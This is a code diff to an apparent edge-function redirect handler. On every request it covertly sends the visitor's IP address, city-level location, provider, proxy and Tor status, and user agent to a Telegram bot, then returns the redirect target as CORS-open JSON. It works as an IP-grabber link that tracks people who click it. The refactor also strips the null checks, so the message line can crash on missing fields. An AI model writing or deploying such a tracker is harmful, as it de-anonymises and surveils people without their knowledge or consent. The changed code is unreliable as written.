@@ -21,15 +21,7 @@ async function sendTelegramLog(request) {
     };
     
     const flag = data.emoji_flag || getFlagEmoji(data.country_code);
-    
-    const message = [
-      `${flag} New Visit [Edge]:`,
-      `IP: ${data.ip || 'N/A'}`,
-      `Location: ${data.country_name || 'N/A'}, ${data.region || 'N/A'}, ${data.city || 'N/A'}`,
-      `Provider: ${data.asn ? data.asn.name : 'N/A'}`,
-      `Threat: Proxy: ${data.threat ? data.threat.is_proxy : 'N/A'}, Tor: ${data.threat ? data.threat.is_tor : 'N/A'}`,
-      `User-Agent: ${userAgent}`
-    ].join('\n');
+    const message = `${flag} New Visit [Edge]:\nIP: ${data.ip}\nLocation: ${data.country_name}, ${data.region}, ${data.city}\nProvider: ${data.asn.name}\nThreat: Proxy: ${data.threat.is_proxy}, Tor: ${data.threat.is_tor}\nUser-Agent: ${userAgent}`;
 
     const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
 
@@ -48,8 +40,14 @@ async function sendTelegramLog(request) {
 
 export default function handler(request, event) {
   const REDIRECT_URL = process.env.REDIRECT_URL;
-  
+
   event.waitUntil(sendTelegramLog(request));
 
-  return Response.redirect(REDIRECT_URL, 307);
+  return new Response(JSON.stringify({ redirectTo: REDIRECT_URL }), {
+    status: 200,
+    headers: {
+      'Content-Type': 'application/json',
+      'Access-Control-Allow-Origin': '*',
+    },
+  });
 }
